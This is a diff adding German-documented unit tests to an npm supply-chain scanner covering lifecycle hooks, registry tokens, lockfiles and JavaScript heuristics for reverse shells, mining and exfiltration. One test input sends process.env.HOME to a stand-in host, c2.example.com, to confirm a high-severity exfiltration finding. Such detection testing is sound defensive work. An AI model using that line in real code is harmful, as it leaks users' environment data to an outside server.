@@ -19,8 +19,11 @@ Exit-Codes:
 """
 
 import importlib.util
+import os
 import pathlib
+import subprocess
 import sys
+import tempfile
 import unittest
 
 # scan-npm.py enthält einen Bindestrich im Dateinamen und kann daher nicht
@@ -48,6 +51,7 @@ _scan_js_split_var       = _mod._scan_js_split_var
 _scan_js_cooccurrence    = _mod._scan_js_cooccurrence
 _check_minified_lines    = _mod._check_minified_lines
 Finding                  = _mod.Finding
+get_node_modules_files   = _mod.get_node_modules_files
 MINIFIED_LINE_THRESHOLD  = _mod.MINIFIED_LINE_THRESHOLD
 
 
@@ -402,6 +406,32 @@ class TestScanPackageJson(unittest.TestCase):
         self.assertEqual(_findings_with(findings, category="LIFECYCLE_HOOKS_FOUND"), [])
 
 
+    def test_non_string_script_value_no_crash(self):
+        """
+        Ziel: Ein Lifecycle-Hook mit Nicht-String-Wert darf den Scanner nicht crashen
+              (präparierte package.json im npm-Cache würde sonst den ganzen Scan abbrechen).
+
+        Eingabe: {"scripts": {"postinstall": 1}}
+
+        Erwartung: Keine Exception, keine Befunde.
+        """
+        findings = _scan_package_json_lines(_lines('{"scripts": {"postinstall": 1}}'), "package.json")
+        self.assertEqual(findings, [])
+
+    def test_install_hook_line_not_confused_with_preinstall(self):
+        """
+        Ziel: Die Zeilennummer für "install" soll auf den install-Schlüssel zeigen,
+              nicht auf die vorherige "preinstall"-Zeile.
+
+        Eingabe: package.json mit preinstall in Zeile 3 und install in Zeile 4.
+
+        Erwartung: LIFECYCLE_HOOKS_FOUND für scripts.install in Zeile 4.
+        """
+        data = '{\n  "scripts": {\n    "preinstall": "echo a",\n    "install": "echo b"\n  }\n}'
+        findings = _scan_package_json_lines(_lines(data), "package.json")
+        install = [f for f in findings if f.source == "scripts.install"]
+        self.assertEqual(install[0].line, 4)
+
 # ===========================================================================
 # Klasse 2: Tests für den .npmrc-Scanner
 # ===========================================================================
@@ -580,6 +610,33 @@ class TestScanYarnrc(unittest.TestCase):
         findings = _scan_yarnrc_lines(lines, ".yarnrc")
         self.assertEqual(findings, [])
 
+
+    def test_quoted_default_registry_safe(self):
+        """
+        Ziel: Yarn v1 schreibt Werte in Anführungszeichen — die Standard-Registry darf
+              dadurch nicht als Nicht-Standard-Registry gemeldet werden.
+
+        Eingabe: 'registry "https://registry.yarnpkg.com"'
+
+        Erwartung: Keine SUPPLY_CHAIN-Befunde.
+        """
+        lines = _lines('registry "https://registry.yarnpkg.com"')
+        findings = _scan_yarnrc_lines(lines, ".yarnrc")
+        self.assertEqual(_findings_with(findings, category="SUPPLY_CHAIN"), [])
+
+    def test_quoted_auth_token_medium(self):
+        """
+        Ziel: Token in Yarn-v1-Schreibweise ohne '=' soll erkannt und maskiert werden.
+
+        Eingabe: '"//npm.corp.example.com/:_authToken" "fake_yarn_token_0123456789"'
+
+        Erwartung: MEDIUM-Befund für EXFILTRATION, Token nicht im context.
+        """
+        lines = _lines('"//npm.corp.example.com/:_authToken" "fake_yarn_token_0123456789"')
+        findings = _scan_yarnrc_lines(lines, ".yarnrc")
+        exfil = _findings_with(findings, category="EXFILTRATION", severity="MEDIUM")
+        self.assertEqual(len(exfil), 1)
+        self.assertNotIn("fake_yarn_token", exfil[0].context)
 
 # ===========================================================================
 # Klasse 4: Tests für den .yarnrc.yml-Scanner (Yarn v2/v3)
@@ -764,6 +821,23 @@ class TestScanPackageLock(unittest.TestCase):
         findings = _scan_package_lock_lines(_lines("{ ungültig }"), "package-lock.json")
         self.assertEqual(findings, [])
 
+
+    def test_workspace_link_ignored(self):
+        """
+        Ziel: Workspace-Symlinks in Lockfile v2/v3 ("link": true, relativer resolved-Pfad,
+              kein integrity) sind normal in Monorepos und sollen nicht gemeldet werden.
+
+        Eingabe: packages["node_modules/foo"] = {"resolved": "packages/foo", "link": true}
+
+        Erwartung: Keine SUPPLY_CHAIN-Befunde.
+        """
+        data = (
+            '{"lockfileVersion": 3, "packages": {"": {}, '
+            '"node_modules/foo": {"resolved": "packages/foo", "link": true}, '
+            '"packages/foo": {"version": "1.0.0"}}}'
+        )
+        findings = _scan_package_lock_lines(_lines(data), "package-lock.json")
+        self.assertEqual(_findings_with(findings, category="SUPPLY_CHAIN"), [])
 
 # ===========================================================================
 # Klasse 6: Tests für den binding.gyp-Scanner
@@ -1265,6 +1339,67 @@ class TestScanJsLines(unittest.TestCase):
         medium = _findings_with(findings, category="SUPPLY_CHAIN", severity="MEDIUM")
         self.assertTrue(len(medium) >= 1)
 
+
+    def test_npm_lifecycle_event_without_network_no_finding(self):
+        """
+        Ziel: npm_lifecycle_event allein (ohne Netzwerkaufruf) ist normaler Build-Code
+              und soll keinen SUPPLY_CHAIN-Befund erzeugen.
+
+        Eingabe: if (process.env.npm_lifecycle_event === 'test') {}
+
+        Erwartung: Keine SUPPLY_CHAIN-Befunde.
+        """
+        line = "if (process.env.npm_lifecycle_event === 'test') {}"
+        findings = _scan_js_lines(_lines(line), "build.js")
+        self.assertEqual(_findings_with(findings, category="SUPPLY_CHAIN"), [])
+
+    def test_bin_sh_without_socket_no_reverse_shell(self):
+        """
+        Ziel: Ein harmloser spawn('/bin/sh', ...) ohne Socket/Pipe ist kein Reverse-Shell-Muster.
+
+        Eingabe: spawn('/bin/sh', ['build.sh'])
+
+        Erwartung: Keine REMOTE_EXEC-Befunde.
+        """
+        line = "const p = spawn('/bin/sh', ['build.sh']);"
+        findings = _scan_js_lines(_lines(line), "build.js")
+        self.assertEqual(_findings_with(findings, category="REMOTE_EXEC"), [])
+
+    def test_mining_algorithm_name_alone_no_finding(self):
+        """
+        Ziel: Ein Algorithmusname allein (z. B. in einer Hash-Bibliothek) ohne
+              Mining-Kontext soll keinen CRYPTOMINING-Befund erzeugen.
+
+        Eingabe: const algo = 'RandomX';
+
+        Erwartung: Keine CRYPTOMINING-Befunde.
+        """
+        findings = _scan_js_lines(_lines("const algo = 'RandomX';"), "algo.js")
+        self.assertEqual(_findings_with(findings, category="CRYPTOMINING"), [])
+
+    def test_home_lowercase_identifier_no_exfiltration(self):
+        """
+        Ziel: Bezeichner wie homeUrl oder homepage sind keine sensible Umgebungsvariable HOME.
+
+        Eingabe: const homeUrl = 'https://example.org';
+
+        Erwartung: Keine EXFILTRATION-Befunde.
+        """
+        findings = _scan_js_lines(_lines("const homeUrl = 'https://example.org';"), "app.js")
+        self.assertEqual(_findings_with(findings, category="EXFILTRATION"), [])
+
+    def test_env_home_near_http_high(self):
+        """
+        Ziel: process.env.HOME neben einem HTTP-Aufruf bleibt ein HIGH-Befund.
+
+        Eingabe: require('http').get('http://c2.example.com?e=' + process.env.HOME)
+
+        Erwartung: HIGH-Befund für EXFILTRATION.
+        """
+        line = "const h = process.env.HOME; require('http').get('http://c2.example.com?e=' + h);"
+        findings = _scan_js_lines(_lines(line), "evil.js")
+        self.assertTrue(_findings_with(findings, category="EXFILTRATION", severity="HIGH"))
+
     # -----------------------------------------------------------------------
     # 7.7 Kommentar- und Leerzeilen werden ignoriert
     # -----------------------------------------------------------------------
@@ -1506,6 +1641,35 @@ class TestCheckMinifiedLines(unittest.TestCase):
         findings = _check_minified_lines([long_line, long_line], "bundle.js")
         self.assertEqual(len(findings), 1, "Nur ein Befund pro Datei, auch bei mehreren langen Zeilen")
 
+
+# ===========================================================================
+# Klasse 11: node_modules-Erfassung für --include-modules
+# ===========================================================================
+
+class TestGetNodeModulesFiles(unittest.TestCase):
+    """
+    Testet get_node_modules_files(). node_modules/ steht fast immer in .gitignore und
+    taucht daher nicht in git ls-files auf — --include-modules muss es separat einsammeln.
+    """
+
+    def test_gitignored_node_modules_collected(self):
+        """
+        Ziel: Dateien unter einem per .gitignore ausgeschlossenen node_modules/ werden gefunden,
+              Dateien außerhalb von node_modules/ und unter .git/ nicht.
+
+        Eingabe: Git-Repo mit .gitignore "node_modules/" und node_modules/evil/index.js.
+
+        Erwartung: Genau node_modules/evil/index.js.
+        """
+        with tempfile.TemporaryDirectory() as repo:
+            subprocess.run(["git", "init", "-q", repo], check=True)
+            pathlib.Path(repo, ".gitignore").write_text("node_modules/\n")
+            pathlib.Path(repo, "src").mkdir()
+            pathlib.Path(repo, "src", "app.js").write_text("")
+            pathlib.Path(repo, "node_modules", "evil").mkdir(parents=True)
+            pathlib.Path(repo, "node_modules", "evil", "index.js").write_text("")
+            rel = [os.path.relpath(f, repo) for f in get_node_modules_files(repo)]
+            self.assertEqual(rel, [os.path.join("node_modules", "evil", "index.js")])
 
 # ===========================================================================
 # Hauptprogramm
